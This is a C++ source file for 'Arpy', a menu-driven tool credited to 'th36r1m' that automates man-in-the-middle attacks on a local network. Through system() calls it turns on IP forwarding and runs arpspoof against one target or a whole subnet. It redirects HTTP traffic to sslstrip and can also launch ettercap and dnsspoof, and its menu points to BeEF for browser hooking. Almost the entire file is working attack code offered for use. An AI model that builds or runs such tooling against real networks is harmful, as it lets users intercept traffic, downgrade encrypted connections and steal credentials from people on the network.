#include <iostream>
#include <string>
#include <cstdlib>
using namespace std;

// Functions
void displayHeader();
int inputOptions();
string getTarget();
string getGateway();
string getInterface();
bool processSelection(int options, string target, string gateway, string iFace);
bool getResponse();

int main() {

	int options;
	string target;
	string gateway;
	string iFace;
	bool exitNow = false;

	while (exitNow == false) {
		displayHeader();

		options = inputOptions();

		if (options == 99) {
			exitNow = true;
		}
	
		else {
			if (options == 1 || options == 3 || options == 5) {
				target = getTarget();
				gateway = getGateway();
				iFace = getInterface();
			}
			else {
				target = "8.8.8.8";
				gateway = getGateway();
				iFace = getInterface();
			}
		}
		exitNow = processSelection(options, target, gateway, iFace);	  
	}
	
	return 0;
}

// Start Functions Below
int inputOptions() {
	int options;

	cout << "[*] If you GOT BEEF start it now...." << endl << endl;

	cout << "[*] Select an option:" << endl << endl;
	cout << "[1] Arpspoof a Single Target" << endl;
	cout << "[2] Arpspoof the Entire Network" << endl;
	cout << "[3] Arpspoof + Ettercap + SSLstrip a single Target" << endl;
	cout << "[4] Arpspoof + Ettercap + SSLstrip Entire Netwrok" << endl;
	cout << "[5] Arpspoof + DNSspoof a Single Target" << endl;
	cout << "[6] Arpspoof + DNSspoof the Entire Network" << endl;

	cout << endl << "[99] Exit" << endl << endl;

	cout << "[*] Selection: ";
	cin >> options;
return options;
}

string getTarget() {
	string targetIP;
	cout << "\n================================FIX TARGET==================================";
	cout << "\n\n[*] Enter Target IP: ";
	cin >> targetIP;
return targetIP;
}

string getGateway() {
	string targetGateway;
	cout << "\n===================================GATEWAY==================================" << endl << endl;

	system("route -n");
	cout << "\n===========================GATEWAY FOR MY MASTER============================";
	cout << "\n\n[*] Enter Target Gateway: ";
	cin >> targetGateway;
return targetGateway;
}

string getInterface() {
	string iFace;
	cout << "\n===============================INTERFACE====================================";
	cout << "\n\n[*] Enter Interface: (wlan1, wlan2, eth0) ";
	cin >> iFace;
return iFace;
}

bool processSelection(int options, string target, string gateway, string iFace) {

	char response;
	bool exitNow = false;
	
	cout << "[*] Starting port forwarding and flushing IP tables..." << endl << endl;
	
	// PORT FORWARD!!!!!
	system("echo '1' > /proc/sys/net/ipv4/ip_forward");
	
	// Flush IP tables
	string clearTables = ("xterm -e iptables -t nat -F &");
	string clearTables1 = ("xterm -e iptables -t nat -L &");
	system(clearTables.c_str());
	system(clearTables1.c_str());

	// dnsspoof
	string dnsStr = ("xterm -e /usr/local/sbin/dnsspoof -i " + iFace + " -f /usr/local/share/dsniff/dnsspoof.hosts &");
	// Arpspoof String with target and gateway
	string spoofStr1 = ("xterm -e arpspoof -i " + iFace + " -t " + target + " " + gateway + " &");
	// Arpspoof String with gateway and target
	string spoofStr2 = ("xterm  -e arpspoof -i " + iFace + " -t " + gateway + " " + target + " &");
	// Arpspoof String with gateway only
	string spoofAll = ("xterm -e arpspoof -i " + iFace + " " + gateway + " &");
	// Ettercap String
	string etterStart = ("xterm -e ettercap -T -q -i " + iFace + " &");
	// SSL Strip String
	string sslStripStart = ("xterm -e python /pentest/web/sslstrip/sslstrip.py -l 10000 -f &");

	// Switch Statement for Options
	switch (options) {
	case 1:
		system(spoofStr1.c_str());
		system(spoofStr2.c_str());
		break;
	case 2:
		system(spoofAll.c_str());
		break;
	case 3:
		cout << "[*] File being saved as sslstrip.log..." << endl << endl;
		system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000");
		system(spoofStr1.c_str());
		system(spoofStr2.c_str());
		system(etterStart.c_str());
		system(sslStripStart.c_str());
		break;
	case 4:
		cout << "[*] File being saved as sslstrip.log..." << endl << endl;
		system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000");
		system(spoofAll.c_str());
		system(etterStart.c_str());
		system(sslStripStart.c_str());
		break;
	case 5:
		cout << "\n[*] Do you want to edit the dnsspoof.conf file? (y or n): ";
		cin >> response;

		if (toupper(response) == 'Y') {
			cout << "\n[*] Press enter to continue...";
			system("xterm -e nano /usr/local/share/dsniff/dnsspoof.hosts &");
			cin.get();
			cin.ignore();
			sleep(1);
			system(spoofStr1.c_str());
			system(spoofStr2.c_str());
			sleep(4);
			system(dnsStr.c_str());
		}
		else {
			system(spoofStr1.c_str());
			system(spoofStr2.c_str());
			sleep(4);
			system(dnsStr.c_str());
		}
		break;
	case 6:
		cout << "\n[*] Do you want to edit the dnsspoof.conf file? (y or n): ";
		cin >> response;

		if (response == 'y') {
			cout << "\n[*] Press enter to continue...";
			system("xterm -e nano /usr/local/share/dsniff/dnsspoof.hosts &");
			cin.ignore();
			cin.get();
			sleep(1);
			system(spoofAll.c_str());
			sleep(4);
			system(dnsStr.c_str());
		}
		else {
			system(spoofAll.c_str());
			sleep(4);
			system(dnsStr.c_str());
		}
		break;
	case 99:
		exitNow = getResponse();
		
		if (exitNow == true) {
			cout << endl << "[*] Cleaning up..." << endl << endl;
			system(clearTables.c_str());
			system(clearTables1.c_str());
			cout << "[*] Exiting..." << endl;
		}
		break;
	}
	return exitNow;
}

bool getResponse() {
	char response;
	bool sendResponse = false;
	
	cout << "[*] Are you sure you want to quit? (Y or N): ";
	cin >> response;

	if (toupper(response) == 'Y') {
		sendResponse = true;
	}
	else {
		sendResponse = false;
	}
	return sendResponse;
}

void displayHeader() {

	cout << endl << endl;
	cout << "  _____/\\\\\\\\\\\\\\\\\\______________________________________________        \n"
			"   ___/\\\\\\\\\\\\\\\\\\\\\\\\\\____________________________________________       \n"
			"    __/\\\\\\/////////\\\\\\_________________/\\\\\\\\\\\\\\\\\\_____/\\\\\\__/\\\\\\_      \n"
			"     _\\/\\\\\\_______\\/\\\\\\__/\\\\/\\\\\\\\\\\\\\___/\\\\\\/////\\\\\\___\\//\\\\\\/\\\\\\__     \n"
			"      _\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\/////\\\\\\_\\/\\\\\\\\\\\\\\\\\\\\_____\\//\\\\\\\\\\___    \n"
			"       _\\/\\\\\\/////////\\\\\\_\\/\\\\\\___\\///__\\/\\\\\\//////_______\\//\\\\\\____   \n"
			"        _\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_________\\/\\\\\\__________/\\\\\_/\\\\\\_____  \n"
			"         _\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_________\\/\\\\\\_________\\//\\\\\\\\/______ \n"
			"          _\\///________\\///__\\///__________\\///___________\\////________";
	cout << endl << endl;

	cout << "Created By: th36r1m" << endl << endl;

	cout << "*****Sometimes you're flush and sometimes you're bust, and when you're up, \n"
			"     it's never as good as it seems, and when you're down, you never think \n"
			"     you'll be up again, but life goes on. -- Fred Jung*****" << endl << endl;
}
